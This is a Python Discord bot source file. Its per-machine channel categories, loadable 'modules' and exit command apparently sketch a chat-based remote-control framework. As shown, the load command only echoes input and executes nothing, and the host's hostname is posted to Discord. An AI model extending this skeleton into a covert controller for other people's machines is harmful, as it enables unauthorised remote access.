import os
import socket
import random
import nextcord
from nextcord.ext import commands

bot = commands.Bot(command_prefix="!", intents=nextcord.Intents.all())

TOKEN = "token"

PC_NAME = f"{socket.gethostname().lower()}-{str(random.randint(1000,9999))}"

modules = {
    os.path.splitext(module)[0]: open(os.path.join('Modules', module)).readline()
            .strip()
            .replace("//", "")
            .replace("/*", "")
            .replace("*/", "")
            .replace("#", "")
            .replace("--", "")
            .split()
    for module in os.listdir('Modules')
} 

@bot.event
async def on_ready():
    for guild in bot.guilds:
        category = await guild.create_category(name=PC_NAME)
        channel = await category.create_text_channel(name="commands")
        await channel.send(f"Loaded modules: {modules}")
           
@bot.command(name="exit")
async def exing(ctx):
    if ctx.channel.category and str(ctx.channel.category.name).lower() == PC_NAME:
        await ctx.reply("Exiting...")
        await ctx.channel.category.delete() 
        exit()

@bot.command(name="load")
async def module(ctx, module_name, *, input_data):
    if ctx.channel.category and str(ctx.channel.category.name).lower() == PC_NAME:
        await ctx.send("Loading...")
        if module_name in modules:
            channel = await ctx.channel.category.create_text_channel(name=module_name)  
            await channel.send(f"Loading module: {module_name}, Data: {input_data.split()}")
        else:
            await ctx.send("Unknown module")

@bot.command(name="deload")
async def deload(ctx, module_name):
    if ctx.channel.category and str(ctx.channel.category.name).lower() == PC_NAME:
        await ctx.send("Deloading...")
        for channel in ctx.channel.category.channels:
            if channel.name == module_name:
                await channel.delete()
                break

if __name__ == "__main__":
    bot.run(TOKEN)
